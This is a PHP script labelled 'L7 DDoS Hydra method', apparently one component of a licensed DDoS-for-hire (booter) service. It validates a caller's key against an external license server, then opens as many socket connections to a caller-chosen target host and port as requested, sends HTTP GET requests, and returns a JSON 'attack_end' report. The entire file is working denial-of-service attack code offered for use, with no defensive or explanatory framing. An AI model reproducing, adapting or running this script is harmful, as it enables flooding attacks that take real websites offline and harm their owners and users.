<?php
/*
 *
 *
 * L7 DDoS Hydra method
 *
 *
 */

error_reporting(0);
if(!$_GET['key']) die('{"type":"error", "code":"access_denied", "message": "Wrong key"}');
$license = json_decode(file_get_contents('https://api.void.cf/validate?token='.$_GET['key']));

if($license->message) {
    $license_type = 'error';
} elseif ($license->type) {
    $license_type = 'success';
}

if($license_type=='error') die('{"type":"error", "code":"access_denied", "message": "Wrong key"}');
if(!$_GET['target'] || !$_GET['port'] || !$_GET['repeats']) die('{"type": "error", "message": "You must specify params correctly"}');

for ($i = 1; $i <= $_GET['repeats']; $i++) {
    $fp = fsockopen($_GET['target'], $_GET['port'], $errno, $errstr, 60);
    if (!$fp) {
        echo "$errstr ($errno)<br />\n";
    } else {
        $out = "GET / HTTP/1.1\r\n";
        $out .= "Host: www.example.com\r\n";
        $out .= "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36\r\n";
        $out .= "Connection: Close\r\n\r\n";
        fwrite($fp, $out);
        while (!feof($fp)) {
            fgets($fp, 128);
        }
        fclose($fp);
    }

    if($i==$_GET['repeats']) {
        die('{
        "type": "success",
        "code": "attack_end",
        "report": {
            "host": "'.$_GET['target'].'",
            "port": "'.$_GET['port'].'",
            "requests": "'.$_GET['repeats'].'",
            "attack_type": "L7"
        }
        }');
    }
}